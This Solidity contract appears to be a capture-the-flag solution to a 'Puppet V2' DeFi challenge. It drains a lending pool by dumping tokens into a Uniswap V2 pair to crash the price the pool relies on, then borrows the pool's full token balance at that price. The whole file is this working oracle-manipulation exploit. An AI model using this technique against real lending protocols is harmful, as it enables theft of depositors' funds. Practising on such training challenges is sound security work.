// SPDX-License-Identifier: UNLICENSED
pragma solidity =0.8.25;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";

interface IPool {
    function borrow(uint256 borrowAmount) external;
    function calculateDepositOfWETHRequired(uint256 tokenAmount) external returns (uint256);
}

contract PuppetV2Attack is Ownable {
    IUniswapV2Router02 private immutable _uni;
    IPool private immutable _pool;
    WETH private immutable _weth;
    IERC20 private immutable _token;
    address private immutable _recovery;

    constructor(address uni, address pool, address weth, address token, address recovery) payable Ownable(msg.sender) {
        _uni = IUniswapV2Router02(uni);
        _pool = IPool(pool);
        _weth = WETH(payable(weth));
        _token = IERC20(token);
        _recovery = recovery;

        _weth.deposit{value: msg.value}();
    }

    function attack() external onlyOwner {
        // TODO 1. transfer the DVT and WETH tokens from the owner to the contract
        uint256 tokenAmount = _token.balanceOf(owner());
        _token.transferFrom(owner(), address(this), tokenAmount);

        // TODO 2. swap DVT for ETH to decrease the price of DVT in terms of ETH
        _token.approve(address(_uni), tokenAmount);
        address[] memory path = new address[](2);
        path[0] = address(_token);
        path[1] = address(_weth);
        _uni.swapExactTokensForTokens(tokenAmount, 1, path, address(this), block.timestamp * 2);

        // TODO 3. borrow all the DVT tokens from the lending pool and send it to the recovery account
        uint256 borrowTokenAmount = _token.balanceOf(address(_pool));
        uint256 wethAmount = _pool.calculateDepositOfWETHRequired(borrowTokenAmount);
        _weth.approve(address(_pool), wethAmount);
        _pool.borrow(borrowTokenAmount);
        _token.transfer(_recovery, _token.balanceOf(address(this)));
    }

    receive() external payable {}
}
